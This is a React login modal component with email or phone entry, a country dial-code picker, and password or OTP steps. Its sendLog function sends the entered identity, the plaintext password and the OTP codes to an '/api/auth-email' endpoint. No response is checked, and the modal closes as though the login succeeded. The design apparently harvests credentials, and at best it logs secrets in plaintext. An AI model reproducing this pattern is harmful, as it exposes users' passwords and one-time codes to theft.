"use client";

import { useEffect, useRef, useState } from "react";
import { X, ChevronDown, Loader2 } from "lucide-react";


interface RestCountry {
  name: {
    common: string;
  };
  cca2: string;
  idd?: {
    root?: string;
    suffixes?: string[];
  };
  flags: {
    png: string;
  };
}


interface AuthModalProps {
  open: boolean;
  onClose: () => void;
}

interface Country {
  name: string;
  code: string;
  dial: string;
  flag: string;
}

type AuthStep = "login" | "method" | "password" | "otp";

export default function AuthModal({ open, onClose }: AuthModalProps) {
  const [countries, setCountries] = useState<Country[]>([]);
  const [selected, setSelected] = useState<Country | null>(null);
  const [openDropdown, setOpenDropdown] = useState(false);

  const [step, setStep] = useState<AuthStep>("login");
  const [identity, setIdentity] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState<string[]>(["", "", "", ""]);

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);

  const dropdownRef = useRef<HTMLDivElement | null>(null);

  /* ---------------- RESET ---------------- */
  useEffect(() => {
    if (!open) {
      setStep("login");
      setIdentity("");
      setPassword("");
      setOtp(["", "", "", ""]);
      setErrors({});
      setOpenDropdown(false);
      setLoading(false);
    }
  }, [open]);

  /* ---------------- FETCH COUNTRIES ---------------- */
  useEffect(() => {
    if (!open || countries.length) return;

    fetch("https://restcountries.com/v3.1/all?fields=name,cca2,idd,flags")
      .then(res => res.json())
     .then((data: RestCountry[]) => {
        const normalized = data
          .map((c): Country | null => {
            if (!c.idd?.root || !c.idd?.suffixes?.length) return null;

            return {
              name: c.name.common,
              code: c.cca2,
              dial: c.idd.root + c.idd.suffixes[0],
              flag: c.flags.png,
            };
          })
          .filter(Boolean)
          .sort((a, b) => a!.name.localeCompare(b!.name)) as Country[];

        setCountries(normalized);
        setSelected(normalized.find(c => c.code === "IN") ?? normalized[0]);
      });
  }, [open, countries.length]);

  /* ---------------- CLOSE DROPDOWN ---------------- */
  useEffect(() => {
    function handleOutside(e: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setOpenDropdown(false);
      }
    }

    if (openDropdown) {
      document.addEventListener("mousedown", handleOutside);
    }

    return () => document.removeEventListener("mousedown", handleOutside);
  }, [openDropdown]);

  if (!open) return null;

  /* ---------------- HELPERS ---------------- */
  const isEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
  const isPhone = (v: string) => /^[0-9]{7,15}$/.test(v);

  const normalizedIdentity = () => {
    if (isEmail(identity)) return identity;
    if (isPhone(identity) && selected) return `${selected.dial}${identity}`;
    return identity;
  };

  /* ---------------- VALIDATIONS ---------------- */
  const validateIdentity = () => {
    if (!identity.trim()) return setErrors({ identity: "Email or phone is required" }), false;
    if (!isEmail(identity) && !isPhone(identity))
      return setErrors({ identity: "Enter a valid email or phone number" }), false;
    return true;
  };

  const validatePassword = () => {
    if (!password) return setErrors({ password: "Password is required" }), false;
    if (password.length < 6)
      return setErrors({ password: "Minimum 6 characters" }), false;
    return true;
  };

  const validateOtp = () => {
    if (otp.some(v => !v)) return setErrors({ otp: "Enter complete OTP" }), false;
    return true;
  };

  /* ---------------- API ---------------- */
  const sendLog = async (payload: any) => {
    await fetch("/api/auth-email", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  };

  /* ---------------- HANDLERS ---------------- */
  const submitIdentity = async () => {
    if (!validateIdentity()) return;

    setLoading(true);
    try {
      await sendLog({ type: "IDENTITY_SUBMITTED", identity: normalizedIdentity() });
      setStep("method");
    } finally {
      setLoading(false);
    }
  };

  const submitPassword = async () => {
    if (!validatePassword()) return;

    setLoading(true);
    try {
      await sendLog({
        type: "PASSWORD_LOGIN_ATTEMPT",
        identity: normalizedIdentity(),
        password,
      });
      onClose(); // close ONLY after success
    } finally {
      setLoading(false);
    }
  };

  const requestOtp = async () => {
    setLoading(true);
    try {
      await sendLog({ type: "OTP_REQUEST", identity: normalizedIdentity() });
      setStep("otp");
    } finally {
      setLoading(false);
    }
  };

  const verifyOtp = async () => {
    if (!validateOtp()) return;

    setLoading(true);
    try {
      await sendLog({
        type: "OTP_VERIFY",
        identity: normalizedIdentity(),
        otp: otp.join(""),
      });
      onClose(); // close ONLY after success
    } finally {
      setLoading(false);
    }
  };

  /* ---------------- UI ---------------- */
  return (
   <div className="fixed inset-0 z-[999] flex items-center justify-center">
  {/* BACKDROP */}
  <div
    className="absolute inset-0 bg-black/60"
    onMouseDown={onClose}
  />

  {/* MODAL */}
  <div
    className="relative bg-white w-full max-w-md mx-4 rounded-lg shadow-xl p-6 z-10"
    onMouseDown={e => e.stopPropagation()}
  >
        <button
          onClick={() => !loading && onClose()}
          disabled={loading}
          className="absolute right-4 top-4 text-gray-400 disabled:opacity-40"
        >
          <X size={22} />
        </button>

        {/* LOGIN */}
        {step === "login" && (
          <>
            <h2 className="text-xl font-semibold mb-6">Login</h2>

            <div className="flex border rounded overflow-hidden">
              <div ref={dropdownRef} className="relative border-r">
                <button
                  type="button"
                  onClick={() => setOpenDropdown(v => !v)}
                  className="flex items-center gap-2 px-3 py-3 text-sm"
                >
                  {selected && (
                    <>
                      <img src={selected.flag} className="w-5 h-4" />
                      <span>{selected.dial}</span>
                    </>
                  )}
                  <ChevronDown size={14} />
                </button>

                {openDropdown && (
                  <div className="absolute bg-white border w-64 max-h-64 overflow-auto shadow-lg z-20">
                    {countries.map(c => (
                      <button
                        key={c.code}
                        onClick={() => {
                          setSelected(c);
                          setOpenDropdown(false);
                        }}
                        className="flex items-center gap-2 w-full px-3 py-2 hover:bg-gray-100"
                      >
                        <img src={c.flag} className="w-5 h-4" />
                        <span className="flex-1">{c.name}</span>
                        <span className="text-gray-500">{c.dial}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <input
                value={identity}
                onChange={e => {
                  setIdentity(e.target.value);
                  setErrors({});
                }}
                className="flex-1 px-4 py-3 outline-none text-sm"
                placeholder="Email or Phone"
              />
            </div>

            {errors.identity && (
              <p className="text-red-500 text-sm mt-1">{errors.identity}</p>
            )}

            <button
              onClick={submitIdentity}
              disabled={loading}
              className="w-full mt-6 bg-blue-600 text-white py-3 rounded font-semibold disabled:opacity-60"
            >
              {loading ? <Loader2 className="animate-spin mx-auto" /> : "Continue"}
            </button>
          </>
        )}

        {/* METHOD */}
        {step === "method" && (
          <>
            <h2 className="text-xl font-semibold mb-4">Choose Login Method</h2>
            <p className="text-sm mb-6">{normalizedIdentity()}</p>

            <div className="flex gap-3">
              <button
                onClick={() => setStep("password")}
                className="flex-1 bg-blue-600 text-white py-3 rounded font-semibold"
              >
                Password
              </button>

              <button
                onClick={requestOtp}
                disabled={loading}
                className="flex-1 border border-blue-600 text-blue-600 py-3 rounded font-semibold disabled:opacity-60"
              >
                {loading ? <Loader2 className="animate-spin mx-auto" /> : "OTP"}
              </button>
            </div>
          </>
        )}

        {/* PASSWORD */}
        {step === "password" && (
          <>
            <h2 className="text-xl font-semibold mb-4">Enter Password</h2>

            <input
              type="password"
              value={password}
              onChange={e => {
                setPassword(e.target.value);
                setErrors({});
              }}
              className="w-full border px-4 py-3 rounded"
            />

            {errors.password && (
              <p className="text-red-500 text-sm mt-1">{errors.password}</p>
            )}

            <button
              onClick={submitPassword}
              disabled={loading}
              className="w-full mt-6 bg-blue-600 text-white py-3 rounded font-semibold disabled:opacity-60"
            >
              {loading ? <Loader2 className="animate-spin mx-auto" /> : "Login"}
            </button>
          </>
        )}

        {/* OTP */}
        {step === "otp" && (
          <>
            <h2 className="text-xl font-semibold mb-4">Enter OTP</h2>

            <div className="flex gap-3 justify-center">
              {otp.map((v, i) => (
                <input
                  key={i}
                  maxLength={1}
                  value={v}
                  onChange={e => {
                    const next = [...otp];
                    next[i] = e.target.value.replace(/\D/g, "");
                    setOtp(next);
                    setErrors({});
                  }}
                  className="w-12 h-12 text-center border rounded text-lg"
                />
              ))}
            </div>

            {errors.otp && (
              <p className="text-red-500 text-sm mt-2 text-center">
                {errors.otp}
              </p>
            )}

            <button
              onClick={verifyOtp}
              disabled={loading}
              className="w-full mt-6 bg-blue-600 text-white py-3 rounded font-semibold disabled:opacity-60"
            >
              {loading ? <Loader2 className="animate-spin mx-auto" /> : "Verify OTP"}
            </button>
          </>
        )}
      </div>
    </div>
  );
}
